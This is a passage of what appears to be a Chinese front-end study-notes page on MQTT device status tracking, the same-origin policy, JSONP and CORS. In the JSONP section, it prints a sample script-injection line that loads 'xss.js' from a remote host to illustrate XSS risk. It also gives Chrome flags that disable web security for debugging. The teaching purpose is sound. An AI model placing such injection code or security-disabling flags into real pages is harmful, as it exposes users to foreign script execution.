    <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ctx<span class="token punctuation">.</span>helper<span class="token punctuation">.</span><span class="token function">emqxAPI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/mqtt/publish'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      topic<span class="token punctuation">,</span>
      payload<span class="token punctuation">,</span>
      qos<span class="token operator">:</span> option<span class="token punctuation">.</span>qos<span class="token punctuation">,</span>
      retain<span class="token operator">:</span> option<span class="token punctuation">.</span>retain<span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h5 id="设备上下线【要点】"><a href="#设备上下线【要点】" class="header-anchor">#</a> 设备上下线【要点】</h5> <ul><li><strong>1:正常的上下线通知都是由客户端主动发送</strong>，即：建立mqtt连接之后的第一条pub消息和断开mqtt连接之前的最后一条pub消息；</li> <li><strong>2:对于异常断开的连接使用MQTT的遗嘱机制让mqtt broker来自动发送异常下线消息;连接时就得先遗嘱事件；</strong></li> <li><strong>3:再加:主动询问是否设备在线;</strong></li></ul> <p>自带的监听事件，没有带相关信息,没有采用：mosquitto $SYS下topic ： $SYS/broker/clients/connected</p> <p>实现：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>mosquitto_sub <span class="token operator">--</span>will<span class="token operator">-</span>topic cn<span class="token operator">/</span>kinfo<span class="token operator">/</span>device<span class="token operator">/</span>will <span class="token operator">--</span>will<span class="token operator">-</span>payload <span class="token string">&quot;mac:11223344&quot;</span> <span class="token operator">-</span>t cn<span class="token operator">/</span>kinfo<span class="token operator">/</span>device<span class="token operator">/</span>will  <span class="token operator">-</span>i sub <span class="token operator">-</span>h <span class="token number">39.108</span><span class="token number">.58</span><span class="token punctuation">.</span>xxx<span class="token operator">:</span><span class="token number">1883</span>
mosquitto_sub <span class="token operator">--</span>will<span class="token operator">-</span>topic cn<span class="token operator">/</span>kinfo<span class="token operator">/</span>device<span class="token operator">/</span>will <span class="token operator">--</span>will<span class="token operator">-</span>payload <span class="token string">&quot;mac:11223344&quot;</span> <span class="token operator">-</span>t cn<span class="token operator">/</span>kinfo<span class="token operator">/</span>device<span class="token operator">/</span>will <span class="token operator">-</span>h <span class="token number">39.108</span><span class="token number">.58</span><span class="token punctuation">.</span>xxx
<span class="token comment">//修改后,调整</span>
 <span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'cn/kinfo/device/will'</span><span class="token punctuation">,</span> controller<span class="token punctuation">.</span>devices<span class="token punctuation">.</span>deviceWill<span class="token punctuation">)</span>

<span class="token comment">//在线,下线,will时,存储到redis hashf类型记录下来;</span>
 <span class="token keyword">let</span> <span class="token punctuation">{</span> mac<span class="token operator">:</span> macStr <span class="token punctuation">}</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>req<span class="token punctuation">.</span>message
 <span class="token keyword">let</span> mac <span class="token operator">=</span> ctx<span class="token punctuation">.</span>helper<span class="token punctuation">.</span><span class="token function">strToMac</span><span class="token punctuation">(</span>macStr<span class="token punctuation">)</span>
 <span class="token keyword">await</span> app<span class="token punctuation">.</span>redis<span class="token punctuation">.</span><span class="token function">hset</span><span class="token punctuation">(</span><span class="token string">'deviceList'</span><span class="token punctuation">,</span> mac<span class="token punctuation">,</span> <span class="token string">'{ &quot;status&quot;: 1 }'</span><span class="token punctuation">)</span>
 <span class="token keyword">await</span> app<span class="token punctuation">.</span>redis<span class="token punctuation">.</span><span class="token function">hdel</span><span class="token punctuation">(</span><span class="token string">'deviceList'</span><span class="token punctuation">,</span> mac<span class="token punctuation">)</span>

<span class="token comment">//获取设备列表查询下,再返回给接口;qos=0;</span>
  <span class="token keyword">async</span> <span class="token function">index</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> ctx<span class="token punctuation">,</span> service<span class="token punctuation">,</span> app <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span>
    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> service<span class="token punctuation">.</span>device<span class="token punctuation">.</span><span class="token function">listByCtx</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> devices <span class="token operator">=</span> res<span class="token punctuation">.</span>rows
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> device <span class="token keyword">of</span> devices<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//主动检查指定设备是否在线</span>
      <span class="token keyword">await</span> app<span class="token punctuation">.</span>emqtt<span class="token punctuation">.</span><span class="token function">publish</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">cn/kinfo/device/statusCheck/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>device<span class="token punctuation">.</span>mac<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">{</span> qos<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> retain<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">await</span> app<span class="token punctuation">.</span>emqtt<span class="token punctuation">.</span><span class="token function">publish</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">cn/kinfo/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>device<span class="token punctuation">.</span>mac<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/status</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">{</span> qos<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> retain<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    ctx<span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token comment">//获取当前在线的设备列表:</span>
 <span class="token keyword">const</span> deviceList <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span>redis<span class="token punctuation">.</span><span class="token function">hgetall</span><span class="token punctuation">(</span><span class="token string">'deviceList'</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> arrList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>deviceList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      arrList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        mac<span class="token operator">:</span> key<span class="token punctuation">,</span>
        info<span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><p>**ps:**在kInfo项目中,由于设备没有15s就会息屏,下线断网,不好频繁操作上报,故现在暂时不做处理;最后还是修改了上下线功能；</p> <h2 id="安全-10题"><a href="#安全-10题" class="header-anchor">#</a> 安全[10题]</h2> <h3 id="跨域"><a href="#跨域" class="header-anchor">#</a> 跨域</h3> <h4 id="同源策略"><a href="#同源策略" class="header-anchor">#</a> 同源策略</h4> <p>同源策略/SOP（Same origin policy）是一种约定;所谓同源是指 &quot;<strong>协议 + 域名 + 端口</strong>&quot; 三者相同，<strong>即便两个不同的域名指向同一个 ip 地址，也非同源。</strong> 从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。<strong>这是一个用于隔离潜在恶意文件的关键的安全机制</strong></p> <h4 id="跨域的含义"><a href="#跨域的含义" class="header-anchor">#</a> 跨域的含义</h4> <p><strong>当协议、域名、端口号，有一个或多个不同时，有希望可以访问并获取数据的现象称为跨域访问</strong>，同源策略限制下 <code>cookie</code>、<code>localStorage</code>、<code>dom</code>、<code>ajax</code>、<code>IndexDB</code> 都是不支持跨域的。</p> <p><strong>不同源之间不能执行以下情况</strong>，以下情况都是同源时执行：</p> <ol><li>Cookie、LocalStorage和indexDB无法读取;</li> <li>AJAX请求不能发送; 限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点;</li> <li>DOM无法获得; 对当前 DOM 对象读和写的操作;</li></ol> <h4 id="实现跨域的方式【要点】"><a href="#实现跨域的方式【要点】" class="header-anchor">#</a> 实现跨域的方式【要点】</h4> <h4 id="方法总括"><a href="#方法总括" class="header-anchor">#</a> 方法总括</h4> <h5 id="开发快捷调试"><a href="#开发快捷调试" class="header-anchor">#</a> 开发快捷调试</h5> <ul><li>webpack proxy代理设置；</li> <li>使用charles等正向代理方式比较简单;  Map Remote 设置；</li> <li>谷歌浏览器启动设置；
<ul><li>新建一个目录。用于存放保存关闭安全策略后的用户信息的，名称和位置随意。【可以不用创建文件夹】</li> <li><strong>win</strong>: 在Chrome的<strong>快捷图标上</strong>鼠标右键  --&gt; 属性 --&gt; 目标  --&gt; 在原chrome路径的基础上加上 <code>--disable-web-security --user-data-dir=D:\MyChromeDev</code> --&gt; 应用。（注意：以上的字符串加在原路径引号外面，且要有空格间隔。）</li> <li><strong>mac</strong>: 在终端中输入：<code>open -n/-a xxx</code>完整： <code>open -n /Applications/Google\ Chrome.app --args --disable-web-security --user-data-dir=/Users/samy/Documents/MyChromeDev</code>；</li> <li>Ps：这个设置如果要考虑到cookie跨越会有问题，可以通过单独通过<code>http-proxy-middleware</code>代理处理；所以建议用token方式最好；</li></ul></li></ul> <h5 id="解决同源策略的方法"><a href="#解决同源策略的方法" class="header-anchor">#</a> <strong>解决同源策略的方法</strong></h5> <ul><li><p>使用 jsonp 跨域；</p></li> <li><p>**使用 CORS 跨域; 可以直接用第三方库。cors库；**跨域资源在服务端设置允许跨域，就可以进行跨域访问控制，从而使跨域数据传输得以安全进行；</p></li> <li><p><strong>使用 nginx 实现跨域</strong></p></li> <li><p>使用 WebSocket 实现跨域</p></li> <li><p><strong>使用 http-proxy-middleware 实现跨域</strong> （webpack）</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token punctuation">{</span> createProxyMiddleware <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-proxy-middleware'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> jsonPlaceholderProxy <span class="token operator">=</span> <span class="token function">createProxyMiddleware</span><span class="token punctuation">(</span><span class="token string">'/api/v1'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
  target<span class="token operator">:</span> <span class="token string">'http://10.45.47.68:xxx'</span><span class="token punctuation">,</span>
  changeOrigin<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div></li> <li><p>使用 postMessage 实现跨域; 可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。</p></li> <li><p>使用 window.name 实现跨域</p></li> <li><p>使用 location.hash 实现跨域</p></li> <li><p>使用 document.domain 实现跨域</p></li></ul> <h4 id="常用跨域实现及原理-5种"><a href="#常用跨域实现及原理-5种" class="header-anchor">#</a> 常用跨域实现及原理(5种)</h4> <h5 id="jsonp实现跨域"><a href="#jsonp实现跨域" class="header-anchor">#</a> jsonp实现跨域</h5> <p>使用场景：当自己的项目前端资源和后端部署在不同的服务器地址上，或者其他的公司需要访问自己对外公开的接口，需要实现跨域获取数据，如百度搜索。</p> <h6 id="原理【要点】"><a href="#原理【要点】" class="header-anchor">#</a> 原理【要点】</h6> <p>由于浏览器的同源策略限制，不允许跨域请求；<strong>但是页面中的 script、img、iframe标签是例外</strong>，不受同源策略限制。<strong>Jsonp 就是利用<code>script</code>标签跨域特性进行请求。</strong></p> <p>JSONP 的原理就是，先在全<strong>局注册一个回调函数，定义回调数据的处理</strong>；与服务端约定好一个同名回调函数名，服务端接收到请求后，将返回一段 Javascript，在这段 Javascript 代码中调用了约定好的回调函数，并且将数据作为参数进行传递。当网页接收到这段 Javascript 代码后，就会执行这个回调函数。</p> <h6 id="缺点-2"><a href="#缺点-2" class="header-anchor">#</a> 缺点</h6> <p>它只支持<code>GET</code>请求，而不支持<code>POST</code>请求等其他类型的HTTP请求。<strong>不处理好的会触发XSS攻击</strong>；</p> <ul><li><strong>只能发送 get 请求</strong> 不支持 post、put、delete；</li> <li>不安全，容易引发 xss 攻击，别人在返回的结果中返回了下面代码。</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">&quot;http://192.168.0.57:8080/xss.js&quot;</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><strong>会把别人的脚本引入到自己的页面中执行，如：弹窗、广告等，甚至更危险的脚本程序</strong>。</p> <h6 id="封装"><a href="#封装" class="header-anchor">#</a> 封装</h6> <p>JSONP 核心原理：script 标签不受同源策略约束，所以可以用来进行跨域请求，优点是兼容性好，但是只能用于 GET 请求；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token function-variable function">jsonp</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> url<span class="token punctuation">,</span> params<span class="token punctuation">,</span> callbackName <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token function-variable function">generateUrl</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> dataSrc <span class="token operator">=</span> <span class="token string">''</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> params<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                dataSrc <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>key<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>params<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&amp;</span><span class="token template-punctuation string">`</span></span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        dataSrc <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">callback=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>callbackName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">?</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>dataSrc<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> scriptEle <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span>
        scriptEle<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token function">generateUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>scriptEle<span class="token punctuation">)</span>
        window<span class="token punctuation">[</span>callbackName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">resolve</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            document<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>scriptEle<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>步骤：</p> <ul><li>拼接发送请求的参数；</li> <li>拼接发送请求的参数并赋值到 src 属性；</li> <li>创建全局函数window.cb = function (data) {}；</li> <li>在跨域拿到数据以后将 script 标签销毁；</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">jsonp</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> url<span class="token punctuation">,</span> params<span class="token punctuation">,</span> cb <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 封装 jsonp 跨域请求的方法</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;script&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    params <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">...</span>params<span class="token punctuation">,</span> cb <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> params<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>key<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>params<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//拼接发送请求的参数</span>
    <span class="token punctuation">}</span>
    script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">?</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">&quot;&amp;&quot;</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span class="token comment">// 拼接发送请求的参数并赋值到 src 属性</span>
    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
    window<span class="token punctuation">[</span>cb<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 创建全局函数window.cb = function (data) {}</span>
      <span class="token function">resolve</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
      document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 在跨域拿到数据以后将 script 标签销毁</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token comment">// 调用方法跨域请求百度搜索的接口</span>
  url<span class="token operator">:</span> <span class="token string">&quot;https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su&quot;</span><span class="token punctuation">,</span>
  params<span class="token operator">:</span> <span class="token punctuation">{</span>
    wd<span class="token operator">:</span> <span class="token string">&quot;jsonp&quot;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  cb<span class="token operator">:</span> <span class="token string">&quot;show&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><h6 id="示例"><a href="#示例" class="header-anchor">#</a> 示例</h6> <blockquote><p>写一个模拟jsonp原理的一个简单的例子</p></blockquote> <p>本地客户端：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">&quot;text/javascript&quot;</span> src<span class="token operator">=</span><span class="token string">&quot;http://xxx.com/Index.aspx?callback=Hello&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>本地回调函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Hello</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token function">alert</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>跨域服务端处理：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">Page_Load</span><span class="token punctuation">(</span><span class="token parameter">object sender<span class="token punctuation">,</span> EventArgs e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     string callback<span class="token operator">=</span>Request<span class="token punctuation">.</span>QueryString<span class="token punctuation">[</span><span class="token string">&quot;callback&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//获取客户端回调函数名，值为&quot;Hello&quot;</span>
     Response<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>callback<span class="token operator">+</span><span class="token string">&quot;({result:1})&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//调用客户端指定函数,并把数据传进去</span>
 <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h5 id="cors实现跨域"><a href="#cors实现跨域" class="header-anchor">#</a> CORS实现跨域</h5> <h6 id="配置-access-controlxxx"><a href="#配置-access-controlxxx" class="header-anchor">#</a> 配置：Access-ControlXXX</h6> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&quot;express&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> whiteList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;http://localhost:3000&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 允许访问域的白名单</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> origin <span class="token operator">=</span> req<span class="token punctuation">.</span>header<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>whiteList<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>origin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 设置那个源可以访问，参数为 * 时，允许任何人访问，但是不可以和 cookie 凭证的响应头共同使用</span>
        res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Access-Control-Allow-Origin&quot;</span><span class="token punctuation">,</span> origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 想要获取 ajax 的头信息，需设置响应头</span>
        res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Access-Control-Allow-Headers&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;name&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 处理复杂请求的头</span>
        res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Access-Control-Allow-Methods&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;PUT&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 允许发送 cookie 凭证的响应头</span>
